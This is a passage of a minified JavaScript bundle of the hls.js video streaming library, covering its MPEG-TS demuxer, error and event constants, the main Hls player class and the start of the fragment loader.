i=r("./src/demux/adts.js"),n=r("./src/demux/mpegaudio.js"),a=r("./src/events.js"),s=r("./src/demux/exp-golomb.js"),o=r("./src/demux/sample-aes.js"),u=r("./src/utils/logger.js"),l=r("./src/errors.js"),c={video:1,audio:2,id3:3,text:4},d=function(){function e(e,t,r,i){this.observer=e,this.config=r,this.typeSupported=i,this.remuxer=t,this.sampleAes=null}return e.prototype.setDecryptData=function(e){null!=e&&null!=e.key&&"SAMPLE-AES"===e.method?this.sampleAes=new o.default(this.observer,this.config,e,this.discardEPB):this.sampleAes=null},e.probe=function(t){var r=e._syncOffset(t);return!(r<0)&&(r&&u.logger.warn("MPEG2-TS detected but first sync word found @ offset "+r+", junk ahead ?"),!0)},e._syncOffset=function(e){for(var t=Math.min(1e3,e.length-564),r=0;r<t;){if(71===e[r]&&71===e[r+188]&&71===e[r+376])return r;r++}return-1},e.createTrack=function(e,t){return{container:"video"===e||"audio"===e?"video/mp2t":void 0,type:e,id:c[e],pid:-1,inputTimeScale:9e4,sequenceNumber:0,samples:[],len:0,dropped:"video"===e?0:void 0,isAAC:"audio"===e||void 0,duration:"audio"===e?t:void 0}},e.prototype.resetInitSegment=function(t,r,i,n){this.pmtParsed=!1,this._pmtId=-1,this._avcTrack=e.createTrack("video",n),this._audioTrack=e.createTrack("audio",n),this._id3Track=e.createTrack("id3",n),this._txtTrack=e.createTrack("text",n),this.aacOverFlow=null,this.aacLastPTS=null,this.avcSample=null,this.audioCodec=r,this.videoCodec=i,this._duration=n},e.prototype.resetTimeStamp=function(){},e.prototype.append=function(t,r,i,n){var s,o,c,d,f,h=t.length,p=!1;this.contiguous=i;var g=this.pmtParsed,y=this._avcTrack,v=this._audioTrack,m=this._id3Track,L=y.pid,M=v.pid,T=m.pid,A=this._pmtId,w=y.pesData,E=v.pesData,S=m.pesData,D=this._parsePAT,b=this._parsePMT,j=this._parsePES,C=this._parseAVCPES.bind(this),I=this._parseAACPES.bind(this),x=this._parseMPEGPES.bind(this),N=this._parseID3PES.bind(this),_=e._syncOffset(t);for(h-=(h+_)%188,s=_;s<h;s+=188)if(71===t[s]){if(o=!!(64&t[s+1]),c=((31&t[s+1])<<8)+t[s+2],(48&t[s+3])>>4>1){if((d=s+5+t[s+4])===s+188)continue}else d=s+4;switch(c){case L:o&&(w&&(f=j(w))&&void 0!==f.pts&&C(f,!1),w={data:[],size:0}),w&&(w.data.push(t.subarray(d,s+188)),w.size+=s+188-d);break;case M:o&&(E&&(f=j(E))&&void 0!==f.pts&&(v.isAAC?I(f):x(f)),E={data:[],size:0}),E&&(E.data.push(t.subarray(d,s+188)),E.size+=s+188-d);break;case T:o&&(S&&(f=j(S))&&void 0!==f.pts&&N(f),S={data:[],size:0}),S&&(S.data.push(t.subarray(d,s+188)),S.size+=s+188-d);break;case 0:o&&(d+=t[d]+1),A=this._pmtId=D(t,d);break;case A:o&&(d+=t[d]+1);var O=b(t,d,!0===this.typeSupported.mpeg||!0===this.typeSupported.mp3,null!=this.sampleAes);(L=O.avc)>0&&(y.pid=L),(M=O.audio)>0&&(v.pid=M,v.isAAC=O.isAAC),(T=O.id3)>0&&(m.pid=T),p&&!g&&(u.logger.log("reparse from beginning"),p=!1,s=_-188),g=this.pmtParsed=!0;break;case 17:case 8191:break;default:p=!0}}else this.observer.trigger(a.default.ERROR,{type:l.ErrorTypes.MEDIA_ERROR,details:l.ErrorDetails.FRAG_PARSING_ERROR,fatal:!1,reason:"TS packet did not start with 0x47"});w&&(f=j(w))&&void 0!==f.pts?(C(f,!0),y.pesData=null):y.pesData=w,E&&(f=j(E))&&void 0!==f.pts?(v.isAAC?I(f):x(f),v.pesData=null):(E&&E.size&&u.logger.log("last AAC PES packet truncated,might overlap between fragments"),v.pesData=E),S&&(f=j(S))&&void 0!==f.pts?(N(f),m.pesData=null):m.pesData=S,null==this.sampleAes?this.remuxer.remux(v,y,m,this._txtTrack,r,i,n):this.decryptAndRemux(v,y,m,this._txtTrack,r,i,n)},e.prototype.decryptAndRemux=function(e,t,r,i,n,a,s){if(e.samples&&e.isAAC){var o=this;this.sampleAes.decryptAacSamples(e.samples,0,function(){o.decryptAndRemuxAvc(e,t,r,i,n,a,s)})}else this.decryptAndRemuxAvc(e,t,r,i,n,a,s)},e.prototype.decryptAndRemuxAvc=function(e,t,r,i,n,a,s){if(t.samples){var o=this;this.sampleAes.decryptAvcSamples(t.samples,0,0,function(){o.remuxer.remux(e,t,r,i,n,a,s)})}else this.remuxer.remux(e,t,r,i,n,a,s)},e.prototype.destroy=function(){this._initPTS=this._initDTS=void 0,this._duration=0},e.prototype._parsePAT=function(e,t){return(31&e[t+10])<<8|e[t+11]},e.prototype._parsePMT=function(e,t,r,i){var n,a,s={audio:-1,avc:-1,id3:-1,isAAC:!0};for(n=t+3+((15&e[t+1])<<8|e[t+2])-4,t+=12+((15&e[t+10])<<8|e[t+11]);t<n;){switch(a=(31&e[t+1])<<8|e[t+2],e[t]){case 207:if(!i){u.logger.log("unkown stream type:"+e[t]);break}case 15:-1===s.audio&&(s.audio=a);break;case 21:-1===s.id3&&(s.id3=a);break;case 219:if(!i){u.logger.log("unkown stream type:"+e[t]);break}case 27:-1===s.avc&&(s.avc=a);break;case 3:case 4:r?-1===s.audio&&(s.audio=a,s.isAAC=!1):u.logger.log("MPEG audio found, not supported in this browser for now");break;case 36:u.logger.warn("HEVC stream type found, not supported for now");break;default:u.logger.log("unkown stream type:"+e[t])}t+=5+((15&e[t+3])<<8|e[t+4])}return s},e.prototype._parsePES=function(e){var t,r,i,n,a,s,o,l,c=0,d=e.data;if(!e||0===e.size)return null;for(;d[0].length<19&&d.length>1;){var f=new Uint8Array(d[0].length+d[1].length);f.set(d[0]),f.set(d[1],d[0].length),d[0]=f,d.splice(1,1)}if(1===((t=d[0])[0]<<16)+(t[1]<<8)+t[2]){if((i=(t[4]<<8)+t[5])&&i>e.size-6)return null;192&(r=t[7])&&((s=536870912*(14&t[9])+4194304*(255&t[10])+16384*(254&t[11])+128*(255&t[12])+(254&t[13])/2)>4294967295&&(s-=8589934592),64&r?((o=536870912*(14&t[14])+4194304*(255&t[15])+16384*(254&t[16])+128*(255&t[17])+(254&t[18])/2)>4294967295&&(o-=8589934592),s-o>54e5&&(u.logger.warn(Math.round((s-o)/9e4)+"s delta between PTS and DTS, align them"),s=o)):o=s),l=(n=t[8])+9,e.size-=l,a=new Uint8Array(e.size);for(var h=0,p=d.length;h<p;h++){var g=(t=d[h]).byteLength;if(l){if(l>g){l-=g;continue}t=t.subarray(l),g-=l,l=0}a.set(t,c),c+=g}return i&&(i-=n+3),{data:a,pts:s,dts:o,len:i}}return null},e.prototype.pushAccesUnit=function(e,t){if(e.units.length&&e.frame){var r=t.samples,i=r.length;!this.config.forceKeyFrameOnDiscontinuity||!0===e.key||t.sps&&(i||this.contiguous)?(e.id=i,r.push(e)):t.dropped++}e.debug.length&&u.logger.log(e.pts+"/"+e.dts+":"+e.debug)},e.prototype._parseAVCPES=function(e,t){var r,i,n,a=this,o=this._avcTrack,u=this._parseAVCNALu(e.data),l=this.avcSample,c=!1,d=this.pushAccesUnit.bind(this),f=function(e,t,r,i){return{key:e,pts:t,dts:r,units:[],debug:i}};e.data=null,l&&u.length&&!o.audFound&&(d(l,o),l=this.avcSample=f(!1,e.pts,e.dts,"")),u.forEach(function(t){switch(t.type){case 1:i=!0,l||(l=a.avcSample=f(!0,e.pts,e.dts,"")),l.frame=!0;var u=t.data;if(c&&u.length>4){var h=new s.default(u).readSliceType();2!==h&&4!==h&&7!==h&&9!==h||(l.key=!0)}break;case 5:i=!0,l||(l=a.avcSample=f(!0,e.pts,e.dts,"")),l.key=!0,l.frame=!0;break;case 6:i=!0,(r=new s.default(a.discardEPB(t.data))).readUByte();for(var p=0,g=0,y=!1,v=0;!y&&r.bytesAvailable>1;){p=0;do{p+=v=r.readUByte()}while(255===v);g=0;do{g+=v=r.readUByte()}while(255===v);if(4===p&&0!==r.bytesAvailable){if(y=!0,181===r.readUByte())if(49===r.readUShort())if(1195456820===r.readUInt())if(3===r.readUByte()){var m=r.readUByte(),L=31&m,M=[m,r.readUByte()];for(n=0;n<L;n++)M.push(r.readUByte()),M.push(r.readUByte()),M.push(r.readUByte());a._insertSampleInOrder(a._txtTrack.samples,{type:3,pts:e.pts,bytes:M})}}else if(g<r.bytesAvailable)for(n=0;n<g;n++)r.readUByte()}break;case 7:if(i=!0,c=!0,!o.sps){var T=(r=new s.default(t.data)).readSPS();o.width=T.width,o.height=T.height,o.pixelRatio=T.pixelRatio,o.sps=[t.data],o.duration=a._duration;var A=t.data.subarray(1,4),w="avc1.";for(n=0;n<3;n++){var E=A[n].toString(16);E.length<2&&(E="0"+E),w+=E}o.codec=w}break;case 8:i=!0,o.pps||(o.pps=[t.data]);break;case 9:i=!1,o.audFound=!0,l&&d(l,o),l=a.avcSample=f(!1,e.pts,e.dts,"");break;case 12:i=!1;break;default:i=!1,l&&(l.debug+="unknown NAL "+t.type+" ")}l&&i&&l.units.push(t)}),t&&l&&(d(l,o),this.avcSample=null)},e.prototype._insertSampleInOrder=function(e,t){var r=e.length;if(r>0){if(t.pts>=e[r-1].pts)e.push(t);else for(var i=r-1;i>=0;i--)if(t.pts<e[i].pts){e.splice(i,0,t);break}}else e.push(t)},e.prototype._getLastNalUnit=function(){var e,t=this.avcSample;if(!t||0===t.units.length){var r=this._avcTrack.samples;t=r[r.length-1]}if(t){var i=t.units;e=i[i.length-1]}return e},e.prototype._parseAVCNALu=function(e){var t,r,i,n,a=0,s=e.byteLength,o=this._avcTrack,u=o.naluState||0,l=u,c=[],d=-1;for(-1===u&&(d=0,n=31&e[0],u=0,a=1);a<s;)if(t=e[a++],u)if(1!==u)if(t)if(1===t){var f,h;if(d>=0)i={data:e.subarray(d,a-u-1),type:n},c.push(i);else if(f=this._getLastNalUnit())if(l&&a<=4-l&&f.state&&(f.data=f.data.subarray(0,f.data.byteLength-l)),(r=a-u-1)>0)(h=new Uint8Array(f.data.byteLength+r)).set(f.data,0),h.set(e.subarray(0,r),f.data.byteLength),f.data=h;a<s?(d=a,n=31&e[a],u=0):u=-1}else u=0;else u=3;else u=t?0:2;else u=t?0:1;(d>=0&&u>=0&&(i={data:e.subarray(d,s),type:n,state:u},c.push(i)),0===c.length)&&((f=this._getLastNalUnit())&&((h=new Uint8Array(f.data.byteLength+e.byteLength)).set(f.data,0),h.set(e,f.data.byteLength),f.data=h));return o.naluState=u,c},e.prototype.discardEPB=function(e){for(var t,r,i=e.byteLength,n=[],a=1;a<i-2;)0===e[a]&&0===e[a+1]&&3===e[a+2]?(n.push(a+2),a+=2):a++;if(0===n.length)return e;t=i-n.length,r=new Uint8Array(t);var s=0;for(a=0;a<t;s++,a++)s===n[0]&&(s++,n.shift()),r[a]=e[s];return r},e.prototype._parseAACPES=function(e){var t,r,n,s,o,c=this._audioTrack,d=e.data,f=e.pts,h=this.aacOverFlow,p=this.aacLastPTS;if(h){var g=new Uint8Array(h.byteLength+d.byteLength);g.set(h,0),g.set(d,h.byteLength),d=g}for(n=0,o=d.length;n<o-1&&!i.isHeader(d,n);n++);if(n){var y=void 0,v=void 0;if(n<o-1?(y="AAC PES did not start with ADTS header,offset:"+n,v=!1):(y="no ADTS header found in AAC PES",v=!0),u.logger.warn("parsing error:"+y),this.observer.trigger(a.default.ERROR,{type:l.ErrorTypes.MEDIA_ERROR,details:l.ErrorDetails.FRAG_PARSING_ERROR,fatal:v,reason:y}),v)return}if(i.initTrackConfig(c,this.observer,d,n,this.audioCodec),r=0,t=i.getFrameDuration(c.samplerate),h&&p){var m=p+t;Math.abs(m-f)>1&&(u.logger.log("AAC: align PTS for overlapping frames by "+Math.round((m-f)/90)),f=m)}for(;n<o;)if(i.isHeader(d,n)&&n+5<o){var L=i.appendFrame(c,d,n,f,r);if(!L)break;n+=L.length,s=L.sample.pts,r++}else n++;h=n<o?d.subarray(n,o):null,this.aacOverFlow=h,this.aacLastPTS=s},e.prototype._parseMPEGPES=function(e){for(var t=e.data,r=t.length,i=0,a=0,s=e.pts;a<r;)if(n.default.isHeader(t,a)){var o=n.default.appendFrame(this._audioTrack,t,a,s,i);if(!o)break;a+=o.length,i++}else a++},e.prototype._parseID3PES=function(e){this._id3Track.samples.push(e)},e}();t.default=d},"./src/errors.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.ErrorTypes={NETWORK_ERROR:"networkError",MEDIA_ERROR:"mediaError",KEY_SYSTEM_ERROR:"keySystemError",MUX_ERROR:"muxError",OTHER_ERROR:"otherError"},t.ErrorDetails={KEY_SYSTEM_NO_KEYS:"keySystemNoKeys",KEY_SYSTEM_NO_ACCESS:"keySystemNoAccess",KEY_SYSTEM_NO_SESSION:"keySystemNoSession",KEY_SYSTEM_LICENSE_REQUEST_FAILED:"keySystemLicenseRequestFailed",MANIFEST_LOAD_ERROR:"manifestLoadError",MANIFEST_LOAD_TIMEOUT:"manifestLoadTimeOut",MANIFEST_PARSING_ERROR:"manifestParsingError",MANIFEST_INCOMPATIBLE_CODECS_ERROR:"manifestIncompatibleCodecsError",LEVEL_LOAD_ERROR:"levelLoadError",LEVEL_LOAD_TIMEOUT:"levelLoadTimeOut",LEVEL_SWITCH_ERROR:"levelSwitchError",AUDIO_TRACK_LOAD_ERROR:"audioTrackLoadError",AUDIO_TRACK_LOAD_TIMEOUT:"audioTrackLoadTimeOut",FRAG_LOAD_ERROR:"fragLoadError",FRAG_LOAD_TIMEOUT:"fragLoadTimeOut",FRAG_DECRYPT_ERROR:"fragDecryptError",FRAG_PARSING_ERROR:"fragParsingError",REMUX_ALLOC_ERROR:"remuxAllocError",KEY_LOAD_ERROR:"keyLoadError",KEY_LOAD_TIMEOUT:"keyLoadTimeOut",BUFFER_ADD_CODEC_ERROR:"bufferAddCodecError",BUFFER_APPEND_ERROR:"bufferAppendError",BUFFER_APPENDING_ERROR:"bufferAppendingError",BUFFER_STALLED_ERROR:"bufferStalledError",BUFFER_FULL_ERROR:"bufferFullError",BUFFER_SEEK_OVER_HOLE:"bufferSeekOverHole",BUFFER_NUDGE_ON_STALL:"bufferNudgeOnStall",INTERNAL_EXCEPTION:"internalException"}},"./src/event-handler.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/logger.js"),n=r("./src/errors.js"),a=r("./src/events.js"),s={hlsEventGeneric:!0,hlsHandlerDestroying:!0,hlsHandlerDestroyed:!0},o=function(){function e(e){for(var t=[],r=1;r<arguments.length;r++)t[r-1]=arguments[r];this.hls=e,this.onEvent=this.onEvent.bind(this),this.handledEvents=t,this.useGenericHandler=!0,this.registerListeners()}return e.prototype.destroy=function(){this.onHandlerDestroying(),this.unregisterListeners(),this.onHandlerDestroyed()},e.prototype.onHandlerDestroying=function(){},e.prototype.onHandlerDestroyed=function(){},e.prototype.isEventHandler=function(){return"object"==typeof this.handledEvents&&this.handledEvents.length&&"function"==typeof this.onEvent},e.prototype.registerListeners=function(){this.isEventHandler()&&this.handledEvents.forEach(function(e){if(s[e])throw new Error("Forbidden event-name: "+e);this.hls.on(e,this.onEvent)},this)},e.prototype.unregisterListeners=function(){this.isEventHandler()&&this.handledEvents.forEach(function(e){this.hls.off(e,this.onEvent)},this)},e.prototype.onEvent=function(e,t){this.onEventGeneric(e,t)},e.prototype.onEventGeneric=function(e,t){try{(function(e,t){var r="on"+e.replace("hls","");if("function"!=typeof this[r])throw new Error("Event "+e+" has no generic handler in this "+this.constructor.name+" class (tried "+r+")");return this[r].bind(this,t)}).call(this,e,t).call()}catch(t){i.logger.error("An internal error happened while handling event "+e+'. Error message: "'+t.message+'". Here is a stacktrace:',t),this.hls.trigger(a.default.ERROR,{type:n.ErrorTypes.OTHER_ERROR,details:n.ErrorDetails.INTERNAL_EXCEPTION,fatal:!1,event:e,err:t})}},e}();t.default=o},"./src/events.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});t.default={MEDIA_ATTACHING:"hlsMediaAttaching",MEDIA_ATTACHED:"hlsMediaAttached",MEDIA_DETACHING:"hlsMediaDetaching",MEDIA_DETACHED:"hlsMediaDetached",BUFFER_RESET:"hlsBufferReset",BUFFER_CODECS:"hlsBufferCodecs",BUFFER_CREATED:"hlsBufferCreated",BUFFER_APPENDING:"hlsBufferAppending",BUFFER_APPENDED:"hlsBufferAppended",BUFFER_EOS:"hlsBufferEos",BUFFER_FLUSHING:"hlsBufferFlushing",BUFFER_FLUSHED:"hlsBufferFlushed",MANIFEST_LOADING:"hlsManifestLoading",MANIFEST_LOADED:"hlsManifestLoaded",MANIFEST_PARSED:"hlsManifestParsed",LEVEL_SWITCHING:"hlsLevelSwitching",LEVEL_SWITCHED:"hlsLevelSwitched",LEVEL_LOADING:"hlsLevelLoading",LEVEL_LOADED:"hlsLevelLoaded",LEVEL_UPDATED:"hlsLevelUpdated",LEVEL_PTS_UPDATED:"hlsLevelPtsUpdated",AUDIO_TRACKS_UPDATED:"hlsAudioTracksUpdated",AUDIO_TRACK_SWITCHING:"hlsAudioTrackSwitching",AUDIO_TRACK_SWITCHED:"hlsAudioTrackSwitched",AUDIO_TRACK_LOADING:"hlsAudioTrackLoading",AUDIO_TRACK_LOADED:"hlsAudioTrackLoaded",SUBTITLE_TRACKS_UPDATED:"hlsSubtitleTracksUpdated",SUBTITLE_TRACK_SWITCH:"hlsSubtitleTrackSwitch",SUBTITLE_TRACK_LOADING:"hlsSubtitleTrackLoading",SUBTITLE_TRACK_LOADED:"hlsSubtitleTrackLoaded",SUBTITLE_FRAG_PROCESSED:"hlsSubtitleFragProcessed",INIT_PTS_FOUND:"hlsInitPtsFound",FRAG_LOADING:"hlsFragLoading",FRAG_LOAD_PROGRESS:"hlsFragLoadProgress",FRAG_LOAD_EMERGENCY_ABORTED:"hlsFragLoadEmergencyAborted",FRAG_LOADED:"hlsFragLoaded",FRAG_DECRYPTED:"hlsFragDecrypted",FRAG_PARSING_INIT_SEGMENT:"hlsFragParsingInitSegment",FRAG_PARSING_USERDATA:"hlsFragParsingUserdata",FRAG_PARSING_METADATA:"hlsFragParsingMetadata",FRAG_PARSING_DATA:"hlsFragParsingData",FRAG_PARSED:"hlsFragParsed",FRAG_BUFFERED:"hlsFragBuffered",FRAG_CHANGED:"hlsFragChanged",FPS_DROP:"hlsFpsDrop",FPS_DROP_LEVEL_CAPPING:"hlsFpsDropLevelCapping",ERROR:"hlsError",DESTROYING:"hlsDestroying",KEY_LOADING:"hlsKeyLoading",KEY_LOADED:"hlsKeyLoaded",STREAM_STATE_TRANSITION:"hlsStreamStateTransition"}},"./src/hls.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./node_modules/url-toolkit/src/url-toolkit.js"),s=r("./src/errors.js"),o=r("./src/loader/playlist-loader.js"),u=r("./src/loader/fragment-loader.js"),l=r("./src/loader/key-loader.js"),c=r("./src/controller/fragment-tracker.js"),d=r("./src/controller/stream-controller.js"),f=r("./src/controller/level-controller.js"),h=r("./src/controller/id3-track-controller.js"),p=r("./src/is-supported.js"),g=r("./src/utils/logger.js"),y=r("./src/config.js"),v=r("./src/events.js"),m=function(e){function t(r){void 0===r&&(r={});var i=e.call(this)||this,n=t.DefaultConfig;if((r.liveSyncDurationCount||r.liveMaxLatencyDurationCount)&&(r.liveSyncDuration||r.liveMaxLatencyDuration))throw new Error("Illegal hls.js config: don't mix up liveSyncDurationCount/liveMaxLatencyDurationCount and liveSyncDuration/liveMaxLatencyDuration");for(var a in n)a in r||(r[a]=n[a]);if(void 0!==r.liveMaxLatencyDurationCount&&r.liveMaxLatencyDurationCount<=r.liveSyncDurationCount)throw new Error('Illegal hls.js config: "liveMaxLatencyDurationCount" must be gt "liveSyncDurationCount"');if(void 0!==r.liveMaxLatencyDuration&&(r.liveMaxLatencyDuration<=r.liveSyncDuration||void 0===r.liveSyncDuration))throw new Error('Illegal hls.js config: "liveMaxLatencyDuration" must be gt "liveSyncDuration"');g.enableLogs(r.debug),i.config=r,i._autoLevelCapping=-1;var s=i.abrController=new r.abrController(i),p=new r.bufferController(i),y=new r.capLevelController(i),v=new r.fpsController(i),m=new o.default(i),L=new u.default(i),M=new l.default(i),T=new h.default(i),A=i.levelController=new f.default(i),w=new c.FragmentTracker(i),E=[A,i.streamController=new d.default(i,w)],S=r.audioStreamController;S&&E.push(new S(i,w)),i.networkControllers=E;var D=[m,L,M,s,p,y,v,T,w];if(S=r.audioTrackController){var b=new S(i);i.audioTrackController=b,D.push(b)}if(S=r.subtitleTrackController){var j=new S(i);i.subtitleTrackController=j,E.push(j)}if(S=r.emeController){var C=new S(i);i.emeController=C,D.push(C)}return(S=r.subtitleStreamController)&&E.push(new S(i,w)),(S=r.timelineController)&&D.push(new S(i)),i.coreComponents=D,i}return n(t,e),Object.defineProperty(t,"version",{get:function(){return"0.12.4"},enumerable:!0,configurable:!0}),t.isSupported=function(){return p.isSupported()},Object.defineProperty(t,"Events",{get:function(){return v.default},enumerable:!0,configurable:!0}),Object.defineProperty(t,"ErrorTypes",{get:function(){return s.ErrorTypes},enumerable:!0,configurable:!0}),Object.defineProperty(t,"ErrorDetails",{get:function(){return s.ErrorDetails},enumerable:!0,configurable:!0}),Object.defineProperty(t,"DefaultConfig",{get:function(){return t.defaultConfig?t.defaultConfig:y.hlsDefaultConfig},set:function(e){t.defaultConfig=e},enumerable:!0,configurable:!0}),t.prototype.destroy=function(){g.logger.log("destroy"),this.trigger(v.default.DESTROYING),this.detachMedia(),this.coreComponents.concat(this.networkControllers).forEach(function(e){e.destroy()}),this.url=null,this.removeAllListeners(),this._autoLevelCapping=-1},t.prototype.attachMedia=function(e){g.logger.log("attachMedia"),this.media=e,this.trigger(v.default.MEDIA_ATTACHING,{media:e})},t.prototype.detachMedia=function(){g.logger.log("detachMedia"),this.trigger(v.default.MEDIA_DETACHING),this.media=null},t.prototype.loadSource=function(e){e=a.buildAbsoluteURL(window.location.href,e,{alwaysNormalize:!0}),g.logger.log("loadSource:"+e),this.url=e,this.trigger(v.default.MANIFEST_LOADING,{url:e})},t.prototype.startLoad=function(e){void 0===e&&(e=-1),g.logger.log("startLoad("+e+")"),this.networkControllers.forEach(function(t){t.startLoad(e)})},t.prototype.stopLoad=function(){g.logger.log("stopLoad"),this.networkControllers.forEach(function(e){e.stopLoad()})},t.prototype.swapAudioCodec=function(){g.logger.log("swapAudioCodec"),this.streamController.swapAudioCodec()},t.prototype.recoverMediaError=function(){g.logger.log("recoverMediaError");var e=this.media;this.detachMedia(),this.attachMedia(e)},Object.defineProperty(t.prototype,"levels",{get:function(){return this.levelController.levels},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"currentLevel",{get:function(){return this.streamController.currentLevel},set:function(e){g.logger.log("set currentLevel:"+e),this.loadLevel=e,this.streamController.immediateLevelSwitch()},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"nextLevel",{get:function(){return this.streamController.nextLevel},set:function(e){g.logger.log("set nextLevel:"+e),this.levelController.manualLevel=e,this.streamController.nextLevelSwitch()},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"loadLevel",{get:function(){return this.levelController.level},set:function(e){g.logger.log("set loadLevel:"+e),this.levelController.manualLevel=e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"nextLoadLevel",{get:function(){return this.levelController.nextLoadLevel},set:function(e){this.levelController.nextLoadLevel=e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"firstLevel",{get:function(){return Math.max(this.levelController.firstLevel,this.minAutoLevel)},set:function(e){g.logger.log("set firstLevel:"+e),this.levelController.firstLevel=e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"startLevel",{get:function(){return this.levelController.startLevel},set:function(e){g.logger.log("set startLevel:"+e);-1!==e&&(e=Math.max(e,this.minAutoLevel)),this.levelController.startLevel=e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"autoLevelCapping",{get:function(){return this._autoLevelCapping},set:function(e){g.logger.log("set autoLevelCapping:"+e),this._autoLevelCapping=e},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"autoLevelEnabled",{get:function(){return-1===this.levelController.manualLevel},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"manualLevel",{get:function(){return this.levelController.manualLevel},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"minAutoLevel",{get:function(){for(var e=this.levels,t=this.config.minAutoBitrate,r=e?e.length:0,i=0;i<r;i++){if((e[i].realBitrate?Math.max(e[i].realBitrate,e[i].bitrate):e[i].bitrate)>t)return i}return 0},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"maxAutoLevel",{get:function(){var e=this.levels,t=this.autoLevelCapping;return-1===t&&e&&e.length?e.length-1:t},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"nextAutoLevel",{get:function(){return Math.min(Math.max(this.abrController.nextAutoLevel,this.minAutoLevel),this.maxAutoLevel)},set:function(e){this.abrController.nextAutoLevel=Math.max(this.minAutoLevel,e)},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"audioTracks",{get:function(){var e=this.audioTrackController;return e?e.audioTracks:[]},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"audioTrack",{get:function(){var e=this.audioTrackController;return e?e.audioTrack:-1},set:function(e){var t=this.audioTrackController;t&&(t.audioTrack=e)},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"liveSyncPosition",{get:function(){return this.streamController.liveSyncPosition},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"subtitleTracks",{get:function(){var e=this.subtitleTrackController;return e?e.subtitleTracks:[]},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"subtitleTrack",{get:function(){var e=this.subtitleTrackController;return e?e.subtitleTrack:-1},set:function(e){var t=this.subtitleTrackController;t&&(t.subtitleTrack=e)},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"subtitleDisplay",{get:function(){var e=this.subtitleTrackController;return!!e&&e.subtitleDisplay},set:function(e){var t=this.subtitleTrackController;t&&(t.subtitleDisplay=e)},enumerable:!0,configurable:!0}),t}(r("./src/observer.js").Observer);t.default=m},"./src/is-supported.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/mediasource-helper.js");t.isSupported=function(){var e=i.getMediaSource(),t=window.SourceBuffer||window.WebKitSourceBuffer,r=e&&"function"==typeof e.isTypeSupported&&e.isTypeSupported('video/mp4; codecs="avc1.42E01E,mp4a.40.2"'),n=!t||t.prototype&&"function"==typeof t.prototype.appendBuffer&&"function"==typeof t.prototype.remove;return!!r&&!!n}},"./src/loader/fragment-loader.js":function(e,t,r){"use strict";(function(e){var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=r("./src/events.js"),s=r("./src/event-handler.js"),o=r("./src/errors.js"),u=r("./src/utils/logger.js"),l=function(t){function r(e){var r=t.call(this,e,a.default.FRAG_LOADING)||this;return r.loaders={},r}return n(r,t),r.prototype.destroy=function(){var e=this.loaders;for(var r in e){var i=e[r];i&&i.destroy()}this.loaders={},t.prototype.destroy.call(this)},r.prototype.onFragLoading=function(t){var r=t.frag,i=r.type,n=this.loaders,a=this.hls.config,s=a.fLoader,o=a.loader;r.loaded=0;var l,c,d,f=n[i];f&&(u.logger.warn("abort previous fragment loader for type: "+i),f.abort()),f=n[i]=r.loader=a.fLoader?new s(a):new o(a),l={url:r.url,frag:r,responseType:"arraybuffer",progressData:!1};var h=r.byteRangeStartOffset,p=r.byteRangeEndOffset;e.isFinite(h)&&e.isFinite(p)&&(l.rangeStart=h,l.rangeEnd=p),c={timeout:a.fragLoadingTimeOut,maxRetry:0,retryDelay:0,maxRetryDelay:a.fragLoadingMaxRetryTimeout},d={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this),onProgress:this.loadprogress.bind(this)},f.load(l,c,d)},r.prototype.loadsuccess=function(e,t,r,i){void 0===i&&(i=null);var n=e.data,s=r.frag;s.loader=void 0,this.loaders[s.type]=void 0,this.hls.trigger(a.default.FRAG_LOADED,{payload:n,frag:s,stats:t,networkDetails:i})},r.prototype.loaderror=function(e,t,r){void 0===r&&(r=null);var i=t.frag,n=i.loader;n&&n.abort(),this.loaders[i.type]=void 0,this.hls.trigger(a.default.ERROR,{type:o.ErrorTypes.NETWORK_ERROR,details:o.ErrorDetails.FRAG_LOAD_ERROR,fatal:!1,frag:t.frag,response:e,networkDetails:r})},r.prototype.loadtimeout=function(e,t,r){void 0===r&&(r=null);var i=t.frag,n=i.loader;n&&n.abort(),this.loaders[i.type]=void 0,this.hls.trigger(a.default.ERROR,{type:o.ErrorTypes.NETWORK_ERROR,details:o.ErrorDetails.FRAG_LOAD_TIMEOUT,fatal:!1,frag:t.frag,networkDetails:r})},r.prototype.loadprogress=function(e,t,r,i){void 0===i&&(i=null);var 